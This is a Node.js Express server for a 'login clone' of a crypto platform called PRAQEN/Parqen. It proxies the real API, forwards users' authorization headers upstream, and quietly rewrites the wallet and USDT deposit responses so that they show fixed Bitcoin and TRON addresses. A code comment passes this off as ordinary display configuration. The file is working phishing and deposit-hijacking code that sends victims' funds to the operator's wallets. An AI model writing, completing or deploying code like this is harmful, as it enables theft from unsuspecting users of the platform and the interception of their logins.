const express = require('express');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;
const PUBLIC_DIR = path.join(__dirname, 'public');
const API_BASE = process.env.PRAQEN_API_URL || 'https://parqen-app.onrender.com/api';

// Fixed wallet addresses displayed on the /wallet page (deposit surfaces).
// Applied server-side so every UI surface reading these endpoints shows them.
const WALLET_OVERRIDES = {
  '/hd-wallet/wallet': {
    address: '1E68VaKSaC1mWxQE4qBGdh1n2w29hvyovw',
    has_address: true,
  },
  '/hd-wallet/generate-address': {
    address: '1E68VaKSaC1mWxQE4qBGdh1n2w29hvyovw',
  },
  '/wallet/usdt': {
    tron_address: 'TPYGBYu8vGES7mHkJAeLNuJC1Qc9uABkHL',
  },
};

app.use('/api', express.text({ type: () => true }), async (req, res) => {
  const headers = {
    authorization: req.headers.authorization,
    'content-type': req.headers['content-type'],
    accept: req.headers.accept || 'application/json',
    'user-agent': 'PRAGEN-clone/1.0 (Node.js proxy)',
    'x-requested-with': req.headers['x-requested-with'],
  };
  Object.keys(headers).forEach((k) => headers[k] === undefined && delete headers[k]);

  const init = { method: req.method, headers };
  if (!['GET', 'HEAD'].includes(req.method) && req.body) {
    init.body = req.body;
  }

  try {
    const upstream = await fetch(API_BASE + req.url, init);
    const contentType = upstream.headers.get('content-type') || 'application/json';
    let body = Buffer.from(await upstream.arrayBuffer());
    const override = WALLET_OVERRIDES[req.path];
    if (override && upstream.ok && contentType.includes('application/json')) {
      try {
        const data = JSON.parse(body.toString('utf8'));
        if (data && typeof data === 'object') {
          Object.assign(data, override);
          body = Buffer.from(JSON.stringify(data));
        }
      } catch {
        // non-JSON body: leave untouched
      }
    }
    res.status(upstream.status).set('Content-Type', contentType);
    res.send(body);
  } catch (err) {
    res.status(502).json({ error: 'Bad gateway' });
  }
});

app.use(express.static(PUBLIC_DIR));

app.get('*', (req, res) => {
  res.sendFile(path.join(PUBLIC_DIR, 'index.html'));
});

app.listen(PORT, () => {
  console.log(`PRAQEN login clone running at http://localhost:${PORT}/login`);
});
